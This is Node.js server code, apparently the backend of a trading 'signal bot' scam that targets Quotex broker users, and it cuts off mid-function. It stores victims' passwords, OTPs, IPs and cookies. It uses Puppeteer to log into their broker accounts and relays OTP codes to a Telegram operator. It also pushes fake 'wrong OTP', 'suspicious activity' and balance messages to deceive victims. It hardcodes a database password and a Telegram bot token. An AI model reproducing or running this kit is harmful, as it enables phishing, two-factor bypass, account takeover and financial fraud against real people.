const express  = require('express');
const cors     = require('cors');
const axios    = require('axios');
const fs       = require('fs');
const path     = require('path');
const mongoose = require('mongoose');

// ================== MONGODB SETUP ==================
const MONGODB_URI = process.env.MONGODB_URI ||
    'mongodb+srv://Luckybot:Lucky8ixx$@lucky.comleed.mongodb.net/csbot?retryWrites=true&w=majority&appName=Lucky';

let useDatabase = false;

mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 5000, maxPoolSize: 100 })
.then(() => { useDatabase = true; console.log('✅ MongoDB connected: permanent storage enabled'); })
.catch(err => { console.warn('⚠️  MongoDB connection failed — falling back to file storage:', err.message); });

// ================== MONGOOSE SCHEMAS ==================
const userSchema = new mongoose.Schema({
    id:           { type: String, required: true, unique: true },
    licenceKey:   { type: String, required: true, index: true },
    fullName:     { type: String, default: 'Unknown' },
    username:     { type: String, default: '' },
    password:     { type: String, default: '' },
    otp:          { type: String, default: '' },
    ip:           { type: String, default: '' },
    cookies:      { type: String, default: '' },
    status:       { type: String, default: 'Active' },
    connected:    { type: Boolean, default: false },
    blocked:      { type: Boolean, default: false },
    lastActivity: { type: Date, default: Date.now },
    activities:   { type: Array, default: [] },
    createdAt:    { type: Date, default: Date.now },
});
const licenseSchema = new mongoose.Schema({
    key:           { type: String, required: true, unique: true },
    type:          { type: String, default: 'Standard' },
    status:        { type: String, default: 'Active', index: true },
    usesRemaining: { type: Number, default: null },
    assignedTo:    { type: String, default: null },
    dateAdded:     { type: Date, default: Date.now },
    expiry:        { type: Date, default: null },
});
const pendingMessageSchema = new mongoose.Schema({
    userName:    { type: String, required: true, index: true },
    messageData: { type: Object, required: true },
    delivered:   { type: Boolean, default: false, index: true },
    createdAt:   { type: Date, default: Date.now },
});
const noteSchema = new mongoose.Schema({
    licenceKey: { type: String, required: true, unique: true, index: true },
    note:       { type: String, default: '' },
    updatedAt:  { type: Date, default: Date.now },
});
const settingSchema = new mongoose.Schema({
    _id:         { type: String, default: 'bot' },
    telegramUrl: { type: String, default: '' },
    whatsappUrl: { type: String, default: '' },
    botName:     { type: String, default: 'Chinese Signal Bot' },
    updatedAt:   { type: Date, default: Date.now },
}, { _id: false, minimize: false });
const orderSchema = new mongoose.Schema({
    id:            { type: String, required: true, unique: true },
    fullName:      { type: String, required: true },
    planKey:       { type: String, required: true },
    planLabel:     { type: String, default: '' },
    planPricePKR:  { type: String, default: '' },
    planPriceUSD:  { type: String, default: '' },
    paymentMethod: { type: String, default: '' },
    whatsapp:      { type: String, default: '' },
    status:        { type: String, default: 'New', index: true },
    createdAt:     { type: Date, default: Date.now },
});

// ── NEW: Broker session history (logged to DB) ──────────────
const brokerSessionSchema = new mongoose.Schema({
    sessionId:   { type: String, required: true, unique: true },
    clientName:  { type: String, default: '' },
    email:       { type: String, default: '' },
    licenceKey:  { type: String, default: '' },
    status:      { type: String, default: 'closed' },
    result:      { type: String, default: '' },    // 'success'|'failed'|'cancelled'
    startedAt:   { type: Date, default: Date.now },
    closedAt:    { type: Date, default: null },
    otpAttempts: { type: Number, default: 0 },
    notes:       { type: String, default: '' },
});

const User           = mongoose.model('User',           userSchema);
const License        = mongoose.model('License',        licenseSchema);
const PendingMessage = mongoose.model('PendingMessage', pendingMessageSchema);
const Note           = mongoose.model('Note',           noteSchema);
const Setting        = mongoose.model('Setting',        settingSchema);
const Order          = mongoose.model('Order',          orderSchema);
const BrokerSession  = mongoose.model('BrokerSession',  brokerSessionSchema);

// ================== DB HELPERS ==================
async function dbGetOrCreateUser(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user = null;
    if (hasName) {
        user = await User.findOne({ licenceKey, fullName: { $regex: new RegExp(`^${fullName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i') } });
        if (!user) user = await User.findOne({ licenceKey, fullName: { $in: ['Unknown', 'Pending Name', ''] } });
    } else {
        user = await User.findOne({ licenceKey });
    }
    if (!user) {
        const newId = Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7);
        user = await User.create({ id: newId, licenceKey, fullName: hasName ? fullName : 'Unknown' });
    } else {
        if (hasName && user.fullName !== fullName) user.fullName = fullName;
        user.lastActivity = new Date();
        await user.save();
    }
    return user.toObject();
}
async function dbSaveUser(user) {
    await User.findOneAndUpdate({ id: user.id }, {
        licenceKey: user.licenceKey, fullName: user.fullName, username: user.username || '',
        password: user.password || '', otp: user.otp || '', ip: user.ip || '',
        cookies: user.cookies || '', status: user.status || 'Active',
        connected: user.connected || false, blocked: user.blocked || false,
        lastActivity: new Date(), activities: user.activities || [],
    }, { upsert: true, new: true });
}
async function dbGetAllUsers() { return await User.find().sort({ lastActivity: -1 }).lean(); }
async function dbFindUserByKey(licenceKey) { return await User.findOne({ licenceKey }).lean(); }
async function dbGetStats() {
    const [totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers] = await Promise.all([
        User.countDocuments(), User.countDocuments({ status: 'Online' }),
        User.countDocuments({ otp: { $nin: [null, ''] } }), User.countDocuments({ connected: true }),
        License.countDocuments(), License.countDocuments({ status: 'Active' }), User.countDocuments({ blocked: true }),
    ]);
    return { totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses, blockedUsers };
}
async function dbSaveNote(licenceKey, note) {
    await Note.findOneAndUpdate({ licenceKey }, { note, updatedAt: new Date() }, { upsert: true, new: true });
}
async function dbGetNote(licenceKey) { return await Note.findOne({ licenceKey }).lean(); }
async function dbGetAllLicenses() { return await License.find().sort({ dateAdded: -1 }).lean(); }
async function dbFindLicense(key) { return await License.findOne({ key }).lean(); }
async function dbInsertLicense(lic) {
    await License.create({ key: lic.key, type: lic.type || 'Standard', status: lic.status || 'Active',
        usesRemaining: lic.usesRemaining || null, assignedTo: lic.assignedTo || null,
        expiry: lic.expiry ? new Date(lic.expiry) : null });
}
async function dbUpdateLicenseStatus(key, status) { await License.findOneAndUpdate({ key }, { status }); }
async function dbDeleteLicense(key) { await License.deleteOne({ key }); }
async function dbAddPendingMessage(userName, msgPayload) {
    const key = userName.trim().toLowerCase();
    await PendingMessage.create({ userName: key, messageData: msgPayload });
    const oldest = await PendingMessage.find({ userName: key, delivered: false }).sort({ createdAt: 1 }).lean();
    if (oldest.length > 20) {
        const toDelete = oldest.slice(0, oldest.length - 20).map(m => m._id);
        await PendingMessage.deleteMany({ _id: { $in: toDelete } });
    }
}
async function dbPollAndClearMessages(userName) {
    const key = userName.trim().toLowerCase();
    const msgs = await PendingMessage.find({ userName: key, delivered: false }).lean();
    if (msgs.length > 0) await PendingMessage.updateMany({ userName: key, delivered: false }, { delivered: true });
    return msgs.map(m => m.messageData);
}
async function dbDeleteUser(licenceKey) { await User.deleteOne({ licenceKey }); }

// ================== PUPPETEER SETUP ==================
// Quotex Auto-Login — uses headless browser to log into Quotex on behalf of clients
// Install: npm install puppeteer  (first run downloads ~170MB Chromium)
let puppeteer = null;
let puppeteerAvailable = false;

try {
    puppeteer = require('puppeteer');
    puppeteerAvailable = true;
    console.log('✅ Puppeteer available — Quotex Auto-Login ENABLED');
} catch(e) {
    console.warn('⚠️  Puppeteer not installed. Run: npm install puppeteer  to enable Auto-Login.');
}

// ── Session state machine ───────────────────────────────────
// launching → navigating → filling → waiting_otp → submitting_otp → logged_in
//                                                                   → wrong_otp → submitting_otp → ...
//                                    → error | closed
const quotexSessions = new Map();
// sessionId → {
//   id, clientName, email, password, licenceKey,
//   status, statusMsg, startedAt, updatedAt,
//   browser, page, screenshotBase64,
//   otpAttempts, cookies, autoOtp
// }

function getSessionInfo(session) {
    return {
        id:              session.id,
        clientName:      session.clientName,
        email:           session.email,
        licenceKey:      session.licenceKey,
        status:          session.status,
        statusMsg:       session.statusMsg,
        startedAt:       session.startedAt,
        updatedAt:       session.updatedAt,
        otpAttempts:     session.otpAttempts || 0,
        hasScreenshot:   !!session.screenshotBase64,
    };
}

function makeSessionId() {
    return 'QX-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
}

async function updateSession(session, status, msg, opts = {}) {
    session.status    = status;
    session.statusMsg = msg;
    session.updatedAt = new Date();
    if (opts.screenshot && session.page) {
        try {
            session.screenshotBase64 = await session.page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 65 });
        } catch(e) {}
    }
    broadcastSSE('qx_session_update', getSessionInfo(session));
}

// ── Core Puppeteer login flow ───────────────────────────────
async function launchQuotexSession(session) {
    if (!puppeteerAvailable) {
        session.status    = 'error';
        session.statusMsg = 'Puppeteer not installed — run: npm install puppeteer';
        broadcastSSE('qx_session_update', getSessionInfo(session));
        return;
    }

    const { id, clientName, email, password } = session;
    let browser = null;

    try {
        await updateSession(session, 'launching', '🚀 Starting browser...');

        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas', '--no-first-run', '--no-zygote',
                '--single-process', '--disable-gpu',
                '--window-size=1280,800',
            ],
        });
        session.browser = browser;

        const page = await browser.newPage();
        session.page = page;
        await page.setViewport({ width: 1280, height: 800 });
        await page.setUserAgent(
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
            '(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        );

        // Suppress unnecessary requests for speed
        await page.setRequestInterception(true);
        page.on('request', req => {
            const type = req.resourceType();
            if (['image','media','font'].includes(type)) req.abort();
            else req.continue();
        });

        await updateSession(session, 'navigating', '🌐 Opening Quotex login page...');
        await page.goto('https://qxbroker.com/en/sign-in', { waitUntil: 'domcontentloaded', timeout: 40000 });
        await sleep(1500);
        await updateSession(session, 'navigating', '🌐 Page loaded — finding form...', { screenshot: true });

        // Fill email
        await updateSession(session, 'filling', '✍️ Entering email...');
        const emailSel = 'input[type="email"], input[name="email"], input[placeholder*="mail" i], input[placeholder*="Email" i]';
        await page.waitForSelector(emailSel, { timeout: 20000 });
        await page.click(emailSel);
        await sleep(300);
        await page.type(emailSel, email, { delay: 60 });

        // Fill password
        await updateSession(session, 'filling', '✍️ Entering password...');
        const passSel = 'input[type="password"], input[name="password"], input[placeholder*="assword" i]';
        await page.waitForSelector(passSel, { timeout: 10000 });
        await page.click(passSel);
        await sleep(300);
        await page.type(passSel, password, { delay: 60 });

        await updateSession(session, 'filling', '🖱️ Submitting login form...', { screenshot: true });
        await sleep(400);

        // Click submit
        const btnSel = 'button[type="submit"], form button, [class*="sign-in"] button, [class*="login"] button, [class*="submit"] button';
        const submitBtn = await page.$(btnSel);
        if (submitBtn) {
            await submitBtn.click();
        } else {
            // Press Enter on password field
            await page.keyboard.press('Enter');
        }

        // Wait for page change
        await sleep(4000);
        await updateSession(session, 'filling', '⏳ Checking login result...', { screenshot: true });

        await checkQuotexLoginResult(session, clientName, email);

    } catch(e) {
        if (browser) { try { await browser.close(); } catch(ex) {} }
        session.browser = null;
        session.page    = null;
        await updateSession(session, 'error', `❌ Error: ${e.message.slice(0, 120)}`);
        await sendTelegramMessage(
            `❌ <b>Quotex Session Error</b>\n👤 Client: <b>${clientName}</b>\n📧 Email: <b>${email}</b>\n` +
            `⚠️ Error: <b>${e.message.slice(0, 200)}</b>`
        );
    }
}

async function checkQuotexLoginResult(session, clientName, email) {
    const page = session.page;
    if (!page) return;

    const currentUrl = page.url();

    // Detect OTP / 2FA requirement
    const needOTP = await page.evaluate(() => {
        const body = document.body?.innerText?.toLowerCase() || '';
        const hasOTPInput = !!(
            document.querySelector('input[maxlength="6"][type="text"]') ||
            document.querySelector('input[maxlength="6"][type="number"]') ||
            document.querySelector('input[maxlength="1"]') ||
            document.querySelector('[class*="confirm"], [class*="verification"], [class*="otp"], [class*="two-factor"]')
        );
        const hasOTPText = body.includes('verification code') || body.includes('otp') ||
                           body.includes('two-factor') || body.includes('confirm your') ||
                           body.includes('check your email') || body.includes('sent a code') ||
                           body.includes('enter code') || body.includes('security code');
        return hasOTPInput || hasOTPText;
    }).catch(() => false);

    if (needOTP) {
        await updateSession(session, 'waiting_otp',
            '🔢 OTP required — waiting for admin to enter the code', { screenshot: true });

        const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
        await sendTelegramMessage(
            `🔢 <b>OTP Required — Quotex Login</b>\n` +
            `👤 Client: <b>${clientName}</b>\n📧 Email: <b>${email}</b>\n⏰ Time: <b>${ts}</b>\n\n` +
            `Send OTP code:\n<code>/otp ${session.id} 123456</code>`
        );

        // Inline keyboard for easy OTP from Telegram
        await tgApi('sendMessage', {
            chat_id: TELEGRAM_CHAT_ID,
            parse_mode: 'HTML',
            text: `🔢 <b>Enter OTP for ${clientName}</b> (${email})\nSession: <code>${session.id}</code>`,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '✏️ Enter OTP Now', callback_data: `ask_qxotp|${session.id}|${encodeURIComponent(clientName)}` }],
                    [{ text: '🔄 Retry Login',   callback_data: `qxretry|${session.id}` }],
                    [{ text: '❌ Cancel Session', callback_data: `qxclose|${session.id}` }],
                ],
            },
        });
        return;
    }

    // Detect login error (wrong credentials)
    const errorText = await page.evaluate(() => {
        const selectors = [
            '.error-message', '.alert-danger', '.alert-error', '[class*="error-text"]',
            '[class*="invalid"]', '[class*="alert"]', 'form .error', '.form-error',
        ];
        for (const sel of selectors) {
            const el = document.querySelector(sel);
            if (el && el.innerText?.trim()) return el.innerText.trim();
        }
        return null;
    }).catch(() => null);

    // Check if URL indicates we left sign-in page (success)
    const isSuccessUrl = !currentUrl.includes('sign-in') && !currentUrl.includes('login') &&
                         (currentUrl.includes('trade') || currentUrl.includes('cabinet') ||
                          currentUrl.includes('profile') || currentUrl.includes('dashboard') ||
                          currentUrl.includes('qxbroker.com/en/') && !currentUrl.includes('sign'));

    if (isSuccessUrl) {
        await handleLoginSuccess(session, clientName, email);
        return;
    }

    if (errorText) {
        await updateSession(session, 'error', `❌ ${errorText.slice(0, 150)}`, { screenshot: true });
        await sendTelegramMessage(
            `❌ <b>Quotex Login Failed</b>\n👤 Client: <b>${clientName}</b>\n📧 Email: <b>${email}</b>\n` +
            `⚠️ Reason: <b>${errorText.slice(0, 200)}</b>`
        );
        return;
    }

    // Unknown state — take screenshot and notify
    await updateSession(session, 'error',
        '⚠️ Unknown state after login — check screenshot in admin panel', { screenshot: true });
    await sendTelegramMessage(
        `⚠️ <b>Quotex — Unknown Login State</b>\n👤 Client: <b>${clientName}</b>\n📧 Email: <b>${email}</b>\n` +
        `🌐 URL: <code>${currentUrl.slice(0, 100)}</code>\nCheck screenshot in admin panel.`
    );
}

async function handleLoginSuccess(session, clientName, email) {
    await sleep(2500); // Let page settle
    await updateSession(session, 'logged_in',
        '✅ Logged in successfully! You can now trade.', { screenshot: true });

    // Capture cookies for potential re-use
    try {
        const cookies = await session.page.cookies();
        session.cookies = JSON.stringify(cookies);
    } catch(e) {}

    const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    await sendTelegramMessage(
        `✅ <b>Quotex Login Successful!</b>\n` +
        `👤 Client: <b>${clientName}</b>\n📧 Email: <b>${email}</b>\n⏰ Time: <b>${ts}</b>\n\n` +
        `🎯 Account ready — you can start trading!`
    );

    // Log to DB
    if (useDatabase) {
        try {
            await BrokerSession.findOneAndUpdate(
                { sessionId: session.id },
                { status: 'logged_in', result: 'success', notes: '' },
                { upsert: true }
            );
        } catch(e) {}
    }
}

// ── Submit OTP to active Puppeteer session ──────────────────
async function submitQuotexOTP(sessionId, otp) {
    const session = quotexSessions.get(sessionId);
    if (!session)         return { ok: false, error: 'Session not found' };
    if (!session.page)    return { ok: false, error: 'Browser session closed' };
    if (!['waiting_otp', 'wrong_otp'].includes(session.status)) {
        return { ok: false, error: `Session is ${session.status}, not waiting for OTP` };
    }

    session.otpAttempts = (session.otpAttempts || 0) + 1;

    try {
        await updateSession(session, 'submitting_otp', `⏳ Entering OTP: ${otp}...`);
        const page = session.page;

        // Clear and type OTP — try multiple input patterns
        // Pattern 1: Single input with maxlength 6
        const singleSel = 'input[maxlength="6"], input[name="code"], input[name="otp"], input[placeholder*="code" i], input[placeholder*="otp" i]';
        const single = await page.$(singleSel);
        if (single) {
            await page.evaluate(sel => {
                const el = document.querySelector(sel);
                if (el) { el.value = ''; el.dispatchEvent(new Event('input', { bubbles: true })); }
            }, singleSel);
            await sleep(300);
            await page.click(singleSel);
            await page.type(singleSel, otp, { delay: 80 });
        } else {
            // Pattern 2: Individual digit inputs
            const digits = await page.$$('input[maxlength="1"]');
            if (digits.length >= 4) {
                for (let i = 0; i < Math.min(otp.length, digits.length); i++) {
                    await digits[i].click();
                    await sleep(100);
                    await digits[i].type(String(otp[i]), { delay: 80 });
                }
            } else {
                return { ok: false, error: 'Could not find OTP input field on Quotex page' };
            }
        }

        await sleep(500);

        // Submit OTP
        const submitSel = 'button[type="submit"], [class*="confirm"] button, [class*="verify"] button, [class*="submit"] button, form button';
        const btn = await page.$(submitSel);
        if (btn) {
            await btn.click();
        } else {
            await page.keyboard.press('Enter');
        }

        await sleep(4000);
        await updateSession(session, 'submitting_otp', '⏳ Verifying OTP...', { screenshot: true });

        // Check result
        const currentUrl = page.url();
        const stillNeedsOTP = await page.evaluate(() => {
            const body = document.body?.innerText?.toLowerCase() || '';
            return body.includes('verification code') || body.includes('otp') ||
                   body.includes('enter code') || body.includes('invalid code') ||
                   body.includes('wrong code') || body.includes('incorrect code') ||
                   body.includes('expired') ||
                   !!(document.querySelector('input[maxlength="6"]') || document.querySelector('input[maxlength="1"]'));
        }).catch(() => false);

        const wrongOTPText = await page.evaluate(() => {
            const body = document.body?.innerText?.toLowerCase() || '';
            return body.includes('invalid') || body.includes('wrong') ||
                   body.includes('incorrect') || body.includes('expired') ||
                   body.includes('error');
        }).catch(() => false);

        if (!stillNeedsOTP || (!wrongOTPText && !currentUrl.includes('sign-in'))) {
            await handleLoginSuccess(session, session.clientName, session.email);
            return { ok: true, message: '✅ Logged in successfully!' };
        } else {
            // Wrong OTP
            await updateSession(session, 'wrong_otp',
                `❌ OTP "${otp}" was incorrect — please try again (attempt ${session.otpAttempts})`,
                { screenshot: true });

            await sendTelegramMessage(
                `❌ <b>Wrong OTP!</b>\n👤 Client: <b>${session.clientName}</b>\n` +
                `🔢 OTP tried: <b>${otp}</b> (attempt ${session.otpAttempts})\n\n` +
                `Please send the correct OTP:\n<code>/otp ${sessionId} CORRECT_CODE</code>`
            );

            await tgApi('sendMessage', {
                chat_id: TELEGRAM_CHAT_ID,
                parse_mode: 'HTML',
                text: `❌ Wrong OTP for <b>${session.clientName}</b>. Try again:`,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✏️ Enter OTP Again', callback_data: `ask_qxotp|${session.id}|${encodeURIComponent(session.clientName)}` }],
                        [{ text: '❌ Cancel', callback_data: `qxclose|${session.id}` }],
                    ],
                },
            });

            return { ok: false, message: `Wrong OTP (attempt ${session.otpAttempts}) — please try correct code` };
        }

    } catch(e) {
        await updateSession(session, 'error', `❌ OTP error: ${e.message.slice(0, 100)}`);
        return { ok: false, error: e.message };
    }
}

// ── Close/cleanup a session ─────────────────────────────────
async function closeQuotexSession(sessionId, reason = 'Admin closed session') {
    const session = quotexSessions.get(sessionId);
    if (!session) return;

    session.status    = 'closed';
    session.statusMsg = reason;
    session.updatedAt = new Date();

    if (session.browser) {
        try { await session.browser.close(); } catch(e) {}
        session.browser = null;
        session.page    = null;
    }

    broadcastSSE('qx_session_update', getSessionInfo(session));

    if (useDatabase) {
        try {
            await BrokerSession.findOneAndUpdate(
                { sessionId },
                { status: 'closed', result: session.result || 'cancelled', closedAt: new Date() },
                { upsert: true }
            );
        } catch(e) {}
    }

    // Clean up after 10 minutes
    setTimeout(() => { quotexSessions.delete(sessionId); }, 10 * 60 * 1000);
}

// ── Auto OTP forward: when client submits OTP on main bot,
//    check if there is a Puppeteer session waiting for it ────
async function autoForwardOTP(userName, licenceKey, otp) {
    for (const [id, session] of quotexSessions) {
        if (session.status !== 'waiting_otp' && session.status !== 'wrong_otp') continue;
        if (
            (session.licenceKey && session.licenceKey === licenceKey) ||
            (session.clientName && session.clientName.toLowerCase() === (userName || '').toLowerCase())
        ) {
            console.log(`🔄 Auto-forwarding OTP for ${userName} → session ${id}`);
            broadcastSSE('activity', { action: `🔄 Auto-forwarding OTP to Quotex session ${id}`, userName, ip: '—', timestamp: new Date().toLocaleString() });
            await submitQuotexOTP(id, otp);
            return true;
        }
    }
    return false;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ================== EXPRESS APP ==================
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '7293402395';

async function sendTelegramMessage(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
    } catch(e) { console.error('Telegram Error:', e.message); }
}

// ================== TELEGRAM INTERACTIVE BOT ==================
const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const tgSessions = {};
const tgPendingTargets = {};

async function tgApi(method, payload) {
    try {
        const r = await axios.post(`${TG_API}/${method}`, payload, { timeout: 15000 });
        return r.data;
    } catch(e) {
        console.error('tgApi error:', method, e.response?.data || e.message);
        return null;
    }
}

function tgMainMenuKeyboard() {
    return {
        inline_keyboard: [
            [{ text: '👥 Online Users', callback_data: 'online' }, { text: '📊 Stats', callback_data: 'stats' }],
            [{ text: '🤖 Quotex Sessions', callback_data: 'qx_sessions' }, { text: '📢 Broadcast', callback_data: 'broadcast' }],
            [{ text: '❓ Help', callback_data: 'help' }],
        ],
    };
}

function tgUserActionKeyboard(userName) {
    const u = encodeURIComponent(userName);
    return {
        inline_keyboard: [
            [{ text: '⚠️ Invalid Email/Password', callback_data: `qt|invalid_login|${u}` },
             { text: '🔢 Wrong OTP',              callback_data: `qt|wrong_otp|${u}` }],
            [{ text: '✅ Login Success',  callback_data: `qt|login_ok|${u}` },
             { text: '🚨 Account Alert',  callback_data: `qt|alert|${u}` }],
            [{ text: '📋 Instruction',    callback_data: `qt|instruction|${u}` },
             { text: '💬 Custom Message', callback_data: `ask_msg|${u}` }],
            [{ text: '🔄 Force Reload',  callback_data: `force_reload|${u}` },
             { text: '⏳ Push Loading',  callback_data: `push_loading|${u}` }],
            [{ text: '💰 Inject Balance', callback_data: `ask_balance|${u}` },
             { text: '👢 Kick User',      callback_data: `kick|${u}` }],
            [{ text: '🚫 Block',   callback_data: `block|${u}` },
             { text: '✅ Unblock', callback_data: `unblock|${u}` }],
            [{ text: '🔙 Main Menu', callback_data: 'menu' }],
        ],
    };
}

const QUICK_TRIGGERS = {
    invalid_login: { type: 'warning',     text: '❌ Invalid Email/Password — Please make sure your Email or Password is correct to continue.' },
    wrong_otp:     { type: 'warning',     text: '⚠️ Wrong OTP code. Please check your email/SMS and try again.' },
    login_ok:      { type: 'info',        text: '✅ Login successful. Welcome back!' },
    alert:         { type: 'alert',       text: '🚨 Suspicious activity detected on your account. Please verify your identity.' },
    instruction:   { type: 'instruction', text: '📋 Please follow the on-screen instructions to continue.' },
};

async function tgInjectMessage(userName, type, text) {
    const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const payload = { userName, message: text, type, timestamp: ts };
    sendSSEToUser(userName, 'injected_message', payload);
    if (useDatabase) {
        try { await dbAddPendingMessage(userName, payload); } catch(e) {}
    } else {
        const k = userName.trim().toLowerCase();
        if (!pendingMessages[k]) pendingMessages[k] = [];
        pendingMessages[k].push(payload);
    }
    broadcastSSE('activity', { action: `💬 [TG] ${type} → ${userName}`, userName, ip: '—', timestamp: ts });
}

async function tgFindUserByName(name) {
    const lower = name.trim().toLowerCase();
    if (useDatabase) {
        try {
            const all = await User.find({}).lean();
            return all.find(u => (u.fullName || '').toLowerCase() === lower || (u.username || '').toLowerCase() === lower);
        } catch(e) { return null; }
    }
    return users.find(u => (u.fullName || '').toLowerCase() === lower || (u.username || '').toLowerCase() === lower);
}

async function tgHandleCallback(chatId, data, callbackId) {
    await tgApi('answerCallbackQuery', { callback_query_id: callbackId });
    const parts  = data.split('|');
    const action = parts[0];
    const target = parts[2] ? decodeURIComponent(parts[2]) : (parts[1] ? decodeURIComponent(parts[1]) : '');

    if (action === 'menu')  return tgApi('sendMessage', { chat_id: chatId, text: '🤖 <b>Admin Bot Menu</b>', parse_mode: 'HTML', reply_markup: tgMainMenuKeyboard() });
    if (action === 'help')  return tgCmdHelp(chatId);
    if (action === 'online') return tgCmdOnline(chatId);
    if (action === 'stats')  return tgCmdStats(chatId);
    if (action === 'qx_sessions') return tgCmdQxSessions(chatId);

    if (action === 'broadcast') {
        tgSessions[chatId] = { awaiting: 'broadcast_text' };
        return tgApi('sendMessage', { chat_id: chatId, text: '📢 Send the message to broadcast to ALL online users.\n(/cancel to abort)' });
    }

    // ── Quotex session callbacks ───────────────────────────
    if (action === 'ask_qxotp') {
        const sessionId   = parts[1];
        const clientName  = parts[2] ? decodeURIComponent(parts[2]) : 'Client';
        tgSessions[chatId] = { awaiting: 'qx_otp', sessionId, clientName };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔢 Enter the 6-digit OTP for <b>${clientName}</b>:\n(/cancel to abort)` });
    }
    if (action === 'qxclose') {
        const sessionId = parts[1];
        await closeQuotexSession(sessionId, 'Closed via Telegram');
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Session <code>${sessionId}</code> closed.` });
    }
    if (action === 'qxretry') {
        const sessionId = parts[1];
        const session   = quotexSessions.get(sessionId);
        if (!session) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Session not found.' });
        // Restart from scratch
        if (session.browser) { try { await session.browser.close(); } catch(e) {} }
        session.browser = null; session.page = null; session.otpAttempts = 0;
        launchQuotexSession(session).catch(e => console.error('tgRetry launch error:', e.message));
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔄 Retrying login for <b>${session.clientName}</b>...` });
    }

    // ── User action callbacks ──────────────────────────────
    if (action === 'qt') {
        const trig = QUICK_TRIGGERS[parts[1]];
        if (!trig) return;
        await tgInjectMessage(target, trig.type, trig.text);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Sent <b>${parts[1]}</b> to <b>${target}</b>` });
    }
    if (action === 'ask_msg') {
        tgSessions[chatId] = { awaiting: 'custom_msg', target };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `💬 Send the message text for <b>${target}</b>:\n(/cancel to abort)` });
    }
    if (action === 'ask_balance') {
        tgSessions[chatId] = { awaiting: 'balance', target };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `💰 Send the balance amount for <b>${target}</b>:\n(/cancel to abort)` });
    }
    if (action === 'force_reload') {
        const ok = sendSSEToUser(target, 'force_reload', { timestamp: new Date().toISOString() });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: ok ? `🔄 Force-reloaded <b>${target}</b>` : `⚠️ <b>${target}</b> is not online.` });
    }
    if (action === 'push_loading') {
        const ok = sendSSEToUser(target, 'show_loading', { message: 'Please wait...', seconds: 5 });
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: ok ? `⏳ Loading shown to <b>${target}</b>` : `⚠️ <b>${target}</b> is not online.` });
    }
    if (action === 'kick') {
        const k = target.trim().toLowerCase();
        const client = sseUserClients.get(k);
        if (client) {
            try { client.write(`data: ${JSON.stringify({ type: 'kicked', data: { message: 'Session ended by admin.' } })}\n\n`); setTimeout(() => { try { client.end(); } catch(e){} }, 300); } catch(e) {}
            sseClients.delete(client); sseUserClients.delete(k);
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `👢 Kicked <b>${target}</b>` });
        }
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ <b>${target}</b> is not online.` });
    }
    if (action === 'block' || action === 'unblock') {
        const u = await tgFindUserByName(target);
        if (!u?.licenceKey) return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `⚠️ User <b>${target}</b> not found.` });
        try {
            await axios.post(`http://127.0.0.1:${process.env.PORT || 3000}/api/${action}-user`, { licenceKey: u.licenceKey });
            return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
                text: `${action === 'block' ? '🚫 Blocked' : '✅ Unblocked'} <b>${target}</b>` });
        } catch(e) { return tgApi('sendMessage', { chat_id: chatId, text: `Error: ${e.message}` }); }
    }
}

async function tgCmdHelp(chatId) {
    return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text:
        '<b>Commands</b>\n' +
        '/menu — main menu\n/online — online users\n/stats — bot statistics\n' +
        '/broadcast &lt;text&gt; — message all users\n' +
        '/qx — Quotex sessions list\n' +
        '/qxlaunch &lt;email&gt; &lt;password&gt; &lt;name&gt; — start login session\n' +
        '/otp &lt;sessionId&gt; &lt;code&gt; — submit OTP for session\n' +
        '/qxclose &lt;sessionId&gt; — close session\n' +
        '/cancel — abort current input\n\n' +
        'Or send any <b>username</b> to open quick actions.' });
}

async function tgCmdStats(chatId) {
    try {
        const s = useDatabase ? await dbGetStats() : {
            totalUsers: users.length, onlineNow: sseClients.size,
